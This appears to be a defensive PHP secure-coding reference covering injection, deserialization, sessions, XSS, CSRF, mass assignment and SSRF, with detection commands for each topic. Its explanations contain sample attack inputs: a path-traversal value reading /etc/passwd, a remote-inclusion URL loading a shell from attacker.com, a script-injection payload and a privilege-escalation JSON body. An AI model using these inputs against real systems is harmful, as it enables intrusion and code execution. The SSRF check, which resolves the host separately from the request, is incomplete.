# PHP Secure Implementation Patterns

Secure-by-default patterns for PHP 8.2+ applications. Each section shows what correct code looks like and why it matters. Load this reference when the task involves security, auth, injection, XSS, CSRF, deserialization, session management, or any vulnerability-related code.

---

## Use Strict Comparisons and strict_types

Declare `strict_types=1` in every PHP file and use `===` for all comparisons, especially security-critical ones.

```php
<?php

declare(strict_types=1);

// Correct: strict comparison for auth checks
function verifyApiKey(string $provided, string $expected): bool {
    return hash_equals($expected, $provided);  // Timing-safe comparison
}

// Correct: strict type checking prevents type juggling
function isAdmin(mixed $role): bool {
    return $role === 'admin';  // "0" !== 0, null !== false, "" !== 0
}

// Correct: validate types before comparison
function findUser(mixed $id): ?User {
    if (!is_int($id) && !is_string($id)) {
        throw new \InvalidArgumentException('Invalid ID type');
    }
    return User::find($id);
}
```

**Why this matters**: PHP's `==` performs type juggling: `"0" == false` is `true`, `"0e1234" == "0e5678"` is `true` (both coerce to float 0), and `null == ""` is `true`. In auth contexts, `$hash == $input` with type juggling can bypass password verification when both values start with `0e` (a magic hash collision). `declare(strict_types=1)` prevents implicit type coercion in function calls.

**Detection**:
```bash
rg -n 'declare\(strict_types' . --type php | head -5
rg -n '\$.*==\s' . --type php | rg -v '===' | rg -i 'password\|token\|hash\|key\|secret\|admin\|role'
```

---

## Use json_decode Instead of unserialize for Untrusted Input

Deserialize untrusted data with `json_decode`. Never use `unserialize` on data from outside the trust boundary.

```php
<?php

declare(strict_types=1);

// Correct: JSON for API payloads and client data
$data = json_decode($requestBody, associative: true, flags: JSON_THROW_ON_ERROR);

// Correct: structured validation after decoding
function parseUserConfig(string $json): array {
    $config = json_decode($json, associative: true, flags: JSON_THROW_ON_ERROR);

    // Validate expected structure
    if (!isset($config['theme']) || !in_array($config['theme'], ['light', 'dark'], strict: true)) {
        throw new \InvalidArgumentException('Invalid theme');
    }

    return $config;
}

// When unserialize is needed for internal data (cache, session):
// Use allowed_classes to restrict what can be instantiated
$data = unserialize($cacheValue, ['allowed_classes' => [DateTime::class, Money::class]]);
```

**Why this matters**: `unserialize($user_data)` executes PHP magic methods (`__wakeup`, `__destruct`, `__toString`) on deserialized objects. Combined with available classes in the autoloader, this produces RCE through well-catalogued gadget chains (Laravel, Symfony, WordPress). `json_decode` cannot instantiate objects or execute code.

**Detection**:
```bash
rg -n 'unserialize\(' . --type php | rg -v 'allowed_classes'
rg -n 'json_decode\(' . --type php
```

---

## Use PDO Prepared Statements for All Database Access

Use PDO with prepared statements and bound parameters. Never concatenate user input into SQL strings.

```php
<?php

declare(strict_types=1);

// Correct: PDO prepared statement with named parameters
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email AND org_id = :org_id');
$stmt->execute(['email' => $email, 'org_id' => $orgId]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

// Correct: PDO prepared statement with positional parameters
$stmt = $pdo->prepare('INSERT INTO invoices (customer_id, amount) VALUES (?, ?)');
$stmt->execute([$customerId, $amount]);

// Correct: Laravel Eloquent (parameterized by default)
$invoices = Invoice::where('customer_id', $customerId)
    ->where('org_id', $orgId)
    ->get();

// Correct: Laravel query builder with bindings
$results = DB::select('SELECT * FROM users WHERE name = ?', [$name]);

// Correct: Doctrine QueryBuilder
$qb = $entityManager->createQueryBuilder();
$qb->select('u')
    ->from(User::class, 'u')
    ->where('u.email = :email')
    ->setParameter('email', $email);
```

**Why this matters**: `$pdo->query("SELECT * FROM users WHERE name = '$name'")` allows SQL injection through string interpolation. Prepared statements separate SQL structure from data at the database driver level, preventing injection regardless of input content. Sequelize CVE-2023-25813 demonstrated that even ORM escape hatches can be vulnerable when used incorrectly.

**Detection**:
```bash
rg -n 'query\(.*\$|exec\(.*\$' . --type php | rg -i 'select\|insert\|update\|delete'
rg -n '->prepare\(' . --type php
rg -n 'DB::raw\(.*\$' . --type php
```

---

## Prevent File Inclusion With User Input

Never pass user input to `include`, `require`, `include_once`, or `require_once`. Use allowlists for dynamic page loading.

```php
<?php

declare(strict_types=1);

// Correct: allowlist-based page routing
$allowedPages = ['home', 'about', 'contact', 'pricing'];

$page = $_GET['page'] ?? 'home';
if (!in_array($page, $allowedPages, strict: true)) {
    $page = 'home';
}
require __DIR__ . '/templates/' . $page . '.php';

// Correct: use a router or switch statement
match ($page) {
    'home' => require __DIR__ . '/templates/home.php',
    'about' => require __DIR__ . '/templates/about.php',
    'contact' => require __DIR__ . '/templates/contact.php',
    default => require __DIR__ . '/templates/404.php',
};
```

**Why this matters**: `include($_GET['page'])` allows Local File Inclusion (LFI) where `?page=../../etc/passwd` reads arbitrary files. With `allow_url_include=On`, it becomes Remote File Inclusion (RFI) where `?page=http://attacker.com/shell.php` executes remote code. The `match` expression or allowlist eliminates this entirely.

**Detection**:
```bash
rg -n 'include.*\$_|require.*\$_|include_once.*\$_|require_once.*\$_' . --type php
rg -n 'include\s*\(\s*\$|require\s*\(\s*\$' . --type php
```

---

## Use password_hash With Strong Algorithms

Hash passwords with `password_hash` using `PASSWORD_BCRYPT` or `PASSWORD_ARGON2ID`. Verify with `password_verify`. Never use MD5, SHA1, or SHA256 for password storage.

```php
<?php

declare(strict_types=1);

// Correct: hash on registration
function hashPassword(string $password): string {
    return password_hash($password, PASSWORD_ARGON2ID, [
        'memory_cost' => 65536,  // 64MB
        'time_cost' => 4,
        'threads' => 3,
    ]);
}

// Correct: verify on login
function verifyPassword(string $password, string $hash): bool {
    return password_verify($password, $hash);
}

// Correct: rehash when algorithm or cost changes
function rehashIfNeeded(string $password, string $hash): ?string {
    if (password_needs_rehash($hash, PASSWORD_ARGON2ID)) {
        return hashPassword($password);
    }
    return null;
}
```

**Why this matters**: `md5($password)` and `sha256($password)` are fast hashes designed for integrity checking, not password storage. A GPU can compute billions of SHA256 hashes per second. `PASSWORD_ARGON2ID` is memory-hard and time-hard, designed to resist GPU and ASIC attacks. `PASSWORD_BCRYPT` has a 72-byte input limit but is widely supported as a fallback.

**Detection**:
```bash
rg -n 'md5\(.*password\|sha1\(.*password\|sha256\(.*password\|hash\(.*password' . --type php
rg -n 'password_hash\|password_verify\|PASSWORD_ARGON2ID\|PASSWORD_BCRYPT' . --type php
```

---

## Regenerate Session ID on Auth State Changes

Regenerate the session ID on login, logout, and privilege elevation. Set secure session cookie attributes.

```php
<?php

declare(strict_types=1);

// Correct: secure session configuration
ini_set('session.cookie_httponly', '1');
ini_set('session.cookie_secure', '1');
ini_set('session.cookie_samesite', 'Lax');
ini_set('session.use_strict_mode', '1');
ini_set('session.use_only_cookies', '1');

// Correct: regenerate on login
function loginUser(User $user): void {
    session_regenerate_id(true);  // true = delete old session file
    $_SESSION['user_id'] = $user->id;
    $_SESSION['role'] = $user->role;
    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
}

// Correct: regenerate on privilege change
function elevateToAdmin(): void {
    session_regenerate_id(true);
    $_SESSION['role'] = 'admin';
}

// Correct: regenerate on logout
function logout(): void {
    $_SESSION = [];
    session_regenerate_id(true);
    session_destroy();
}

// Correct: Laravel session regeneration
public function login(Request $request): RedirectResponse {
    $request->session()->regenerate();
    // ...
}
```

**Why this matters**: Without session regeneration, an attacker who captures a pre-login session ID (via XSS, network sniffing, or session fixation) retains access after the victim authenticates. `session_regenerate_id(true)` creates a new ID and deletes the old session data, breaking the fixation chain.

**Detection**:
```bash
rg -n 'session_regenerate_id' . --type php
rg -n 'session_start\(\)' . --type php
rg -n 'session\.cookie_httponly\|session\.cookie_secure' . --type php
```

---

## Escape Output With htmlspecialchars

Escape all dynamic output in HTML context using `htmlspecialchars` with `ENT_QUOTES` and explicit encoding. Use framework template engines that auto-escape by default.

```php
<?php

declare(strict_types=1);

// Correct: htmlspecialchars with ENT_QUOTES for HTML output
function e(string $value): string {
    return htmlspecialchars($value, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

// In plain PHP templates:
<p>Hello, <?= e($username) ?></p>
<input type="text" value="<?= e($searchQuery) ?>">
<a href="/profile?id=<?= e((string)$userId) ?>">Profile</a>

// Correct: Laravel Blade (auto-escapes {{ }})
// {{ $username }} — escaped
// {!! $trustedHtml !!} — raw (only for trusted content)

// Correct: Symfony Twig (auto-escapes {{ }})
// {{ username }} — escaped
// {{ trusted_html|raw }} — raw (only for trusted content)
```

**Why this matters**: `echo $username` without escaping allows XSS when `$username` contains `<script>alert(1)</script>`. `ENT_QUOTES` escapes both single and double quotes, preventing attribute-value breakout. The `ENT_SUBSTITUTE` flag replaces invalid encoding sequences instead of returning empty strings.

**Detection**:
```bash
rg -n 'echo\s+\$|print\s+\$' . --type php | rg -v 'htmlspecialchars\|htmlentities\|e\('
rg -n '<\?=\s*\$' . --type php | rg -v 'htmlspecialchars\|e\('
```

---

## Implement CSRF Token Validation

Include and verify CSRF tokens on all state-changing forms. Use framework-provided CSRF protection when available.

```php
<?php

declare(strict_types=1);

// Correct: generate CSRF token
function generateCsrfToken(): string {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// Correct: verify CSRF token
function verifyCsrfToken(string $token): bool {
    return hash_equals($_SESSION['csrf_token'] ?? '', $token);
}

// In forms:
// <input type="hidden" name="_token" value="<?= e(generateCsrfToken()) ?>">

// In request handling:
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!verifyCsrfToken($_POST['_token'] ?? '')) {
        http_response_code(403);
        exit('CSRF validation failed');
    }
    // ...process form
}

// Correct: Laravel (automatic with @csrf)
// <form method="POST">
//     @csrf
//     ...
// </form>

// Correct: Symfony (automatic with form component)
// {{ form_start(form) }}  — includes _token automatically
```

**Why this matters**: Without CSRF tokens, any website can submit forms to your application using the visitor's authenticated session. The visitor's browser automatically includes session cookies with the cross-origin request. CSRF tokens prove the form submission originated from your application. Use `hash_equals` for timing-safe token comparison.

**Detection**:
```bash
rg -n 'csrf_token\|_token\|@csrf' . --type php
rg -n '<form.*method.*POST' . --type php
rg -n 'VerifyCsrfToken\|csrf.*except' . --type php
```

---

## Use Mass Assignment Protection

Always specify allowed fields for mass assignment. Never pass raw request data to model create/update methods.

```php
<?php

declare(strict_types=1);

// Correct: Laravel Eloquent with $fillable allowlist
class User extends Model {
    protected $fillable = ['name', 'email', 'avatar_url'];
    // $guarded is the inverse; prefer $fillable for explicitness
    // Never: protected $guarded = [];  // Allows all fields
}

// Correct: validate and extract specific fields
$validated = $request->validate([
    'name' => 'required|string|max:100',
    'email' => 'required|email',
    'avatar_url' => 'nullable|url',
]);
$user->update($validated);

// Correct: Symfony with explicit DTO
class UpdateProfileCommand {
    public function __construct(
        public readonly string $name,
        public readonly string $email,
        public readonly ?string $avatarUrl = null,
    ) {}
}

// Map request to DTO, then to entity
$command = new UpdateProfileCommand(
    name: $request->get('name'),
    email: $request->get('email'),
    avatarUrl: $request->get('avatar_url'),
);
```

**Why this matters**: `User::create($request->all())` allows an attacker to POST `{"is_admin": true, "role": "superadmin"}` and set arbitrary model attributes. The `$fillable` allowlist restricts which attributes can be set via mass assignment. This is the PHP equivalent of DRF's `fields = '__all__'` problem.

**Detection**:
```bash
rg -n '\$guarded\s*=\s*\[\s*\]' . --type php
rg -n '::create\(\$request->all\(\)\)|->update\(\$request->all\(\)\)' . --type php
rg -n '\$fillable' . --type php
```

---

## Validate Outbound URLs to Prevent SSRF

Resolve hostnames to IPs and validate against private ranges before making outbound HTTP requests.

```php
<?php

declare(strict_types=1);

function validateUrl(string $url): string {
    $parsed = parse_url($url);
    if (!$parsed || !in_array($parsed['scheme'] ?? '', ['http', 'https'], strict: true)) {
        throw new \InvalidArgumentException('Invalid URL scheme');
    }

    $host = $parsed['host'] ?? '';
    $ip = gethostbyname($host);
    if ($ip === $host) {
        throw new \InvalidArgumentException('DNS resolution failed');
    }

    // Block private/internal ranges
    $flags = FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE;
    if (filter_var($ip, FILTER_VALIDATE_IP, $flags) === false) {
        throw new \InvalidArgumentException('Disallowed IP range');
    }

    return $url;
}

// Usage with Guzzle
$validatedUrl = validateUrl($userUrl);
$response = $client->get($validatedUrl, [
    'allow_redirects' => false,
    'timeout' => 10,
]);
```

**Why this matters**: User-controlled URLs reach internal services including cloud metadata endpoints (`169.254.169.254`). `FILTER_FLAG_NO_PRIV_RANGE` and `FILTER_FLAG_NO_RES_RANGE` reject RFC1918 and reserved addresses. Disable redirect following to prevent redirect-based bypasses.

**Detection**:
```bash
rg -n 'file_get_contents\(.*\$|curl_exec\|Guzzle.*\$' . --type php
rg -n 'FILTER_FLAG_NO_PRIV_RANGE\|FILTER_FLAG_NO_RES_RANGE' . --type php
```
